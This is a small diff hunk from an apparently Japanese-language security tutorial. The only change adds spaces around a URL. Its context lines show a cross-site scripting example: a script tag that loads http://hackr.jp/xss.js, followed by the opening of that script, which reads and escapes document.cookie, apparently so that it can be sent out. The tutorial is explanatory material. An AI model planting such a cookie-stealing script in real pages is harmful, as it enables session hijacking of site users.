@@ -81,7 +81,7 @@ Noneの値を設定すると、ブラウザはすべての閲覧コンテキス�
 <script src=http://hackr.jp/xss.js></scriot>
 ```
 
-このスクリプトが指し示すhttp://hackr.jp/xss.jsは下記のJavaScriptが記述されている
+このスクリプトが指し示す http://hackr.jp/xss.js は下記のJavaScriptが記述されている
 
 ```
 const content = escape(document.cookie);
